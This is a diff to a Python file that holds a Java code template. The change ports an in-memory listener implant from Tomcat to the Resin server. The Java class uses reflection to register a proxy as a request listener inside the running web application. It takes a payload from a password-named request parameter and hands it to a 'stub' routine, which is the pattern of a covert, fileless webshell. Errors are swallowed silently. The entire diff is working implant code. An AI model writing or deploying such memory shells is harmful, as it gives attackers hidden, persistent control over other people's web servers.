@@ -2,8 +2,9 @@ code = """
 import java.lang.reflect.*;
 import java.util.*;
 
-public class TomcatListener implements InvocationHandler {{
+public class ResinListener implements InvocationHandler {{
     private static String password = "{password}";
+    private static boolean initialized = false;
 {common}
 {context}
 {decoder}
@@ -12,12 +13,11 @@ public class TomcatListener implements InvocationHandler {{
         Object servletRequest = invokeMethod(
             servletRequestEvent, "getServletRequest"
         );
-        Object request = getFieldValue(servletRequest, "request");
-        Object response = invokeMethod(request, "getResponse");
+        Object servletResponse = invokeMethod(servletRequest, "getResponse");
         String payload = (String) invokeMethod(
             servletRequest, "getParameter", password
         );
-        stub(payload, request, response);
+        stub(payload, servletRequest, servletResponse);
     }}
 
     @Override
@@ -31,32 +31,26 @@ public class TomcatListener implements InvocationHandler {{
     }}
 
     private void addListener(Object proxyObject) throws Exception {{
-        Object context = getStandardContext();
-        for (Object listener :
-            (Object[]) invokeMethod(context, "getApplicationEventListeners")
-        ) {{
-            if (listener instanceof Proxy) {{
-                return;
-            }}
-        }}
-        getMethodX(context.getClass(), "addApplicationEventListener", 1)
-            .invoke(context, proxyObject);
+        Object webApp = getWebApp();
+        Method addListenerObject = getMethodX(
+            webApp.getClass(), "addListenerObject", 2
+        );
+        addListenerObject.setAccessible(true);
+        addListenerObject.invoke(webApp, proxyObject, true);
     }}
 
-    public TomcatListener() {{
+    public ResinListener() {{
         synchronized(lock) {{
+            if (initialized != false) {{
+                return;
+            }}
+
             Class servletRequestListener = null;
             try {{
                 servletRequestListener = Class.forName(
                     "javax.servlet.ServletRequestListener"
                 );
-            }} catch (ClassNotFoundException e) {{
-                try {{
-                    servletRequestListener = Class.forName(
-                        "jakarta.servlet.ServletRequestListener"
-                    );
-                }} catch (ClassNotFoundException ex) {{}}
-            }}
+            }} catch (ClassNotFoundException e) {{}}
 
             if (servletRequestListener != null) {{
                 Object proxyObject = Proxy.newProxyInstance(
@@ -64,13 +58,14 @@ public class TomcatListener implements InvocationHandler {{
                 );
                 try {{
                     addListener(proxyObject);
+                    initialized = true;
                 }} catch (Exception e) {{}}
             }}
         }}
     }}
 
     static {{
-        new TomcatListener();
+        new ResinListener();
     }}
 }}
 """
